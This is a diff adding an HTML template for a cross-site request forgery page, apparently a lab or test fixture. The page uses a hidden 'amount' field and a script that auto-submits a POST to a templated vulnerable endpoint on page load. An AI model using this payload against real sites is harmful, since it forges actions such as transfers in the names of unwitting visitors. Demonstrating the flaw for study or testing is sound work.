@@ -1,0 +1,17 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <title>CSRF attack page</title>
+  </head>
+  <body>
+    <h1>External-looking page</h1>
+    <p>This page silently submits a POST to the vulnerable endpoint.</p>
+    <form method="post" action="{{ target }}">
+      <input type="hidden" name="amount" value="75">
+    </form>
+    <script>
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
